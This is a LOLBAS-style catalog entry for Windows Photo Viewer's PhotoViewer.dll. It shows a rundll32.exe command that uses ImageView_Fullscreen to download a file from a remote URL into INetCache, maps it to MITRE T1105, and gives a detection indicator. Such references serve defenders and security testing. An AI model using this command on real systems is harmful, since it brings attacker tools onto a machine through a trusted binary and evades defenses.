---
Acknowledgement:
- Handle: '@avihayeldad'
  Person: Avihay Eldad
- Person: Tommy War
Author: Avihay Eldad
Commands:
- Category: Download
  Command: rundll32.exe "C:\Program Files\Windows Photo Viewer\PhotoViewer.dll",ImageView_Fullscreen
    {REMOTEURL}
  Description: Once executed, rundll32.exe will download the file at the specified
    URL to the user's INetCache folder using the Windows Photo Viewer DLL.
  MitreID: T1105
  OperatingSystem: Windows 10, Windows 11
  Privileges: User
  Tags:
  - Download: INetCache
  Usecase: Download file from remote location.
Created: 2025-06-22
Description: Windows Photo Viewer
Detection:
- IOC: Execution of rundll32.exe with 'ImageView_Fullscreen' and a remote URL (containing
    '://') as an argument
Full_Path:
- Path: C:\Program Files\Windows Photo Viewer\PhotoViewer.dll
- Path: C:\Program Files (x86)\Windows Photo Viewer\PhotoViewer.dll
Name: PhotoViewer.dll
mitre_data:
  technique_ids:
  - T1105
tags:
- lolbas/oslibraries
---

# PhotoViewer.dll

Windows Photo Viewer

# Path(s)

- `C:\Program Files\Windows Photo Viewer\PhotoViewer.dll`
- `C:\Program Files (x86)\Windows Photo Viewer\PhotoViewer.dll`

# Download Commands

Once executed, rundll32.exe will download the file at the specified URL to the user's INetCache folder using the Windows Photo Viewer DLL.

```batch
rundll32.exe "C:\Program Files\Windows Photo Viewer\PhotoViewer.dll",ImageView_Fullscreen {REMOTEURL}
```

- **Usecase:** Download file from remote location.
- **Privileges Required:** User
- **MitreID:** `T1105`
- **Operating System(s):** Windows 10, Windows 11


# Acknowledgements

- Avihay Eldad (Authored, 2025-06-22)
- Avihay Eldad (@avihayeldad)
- Tommy War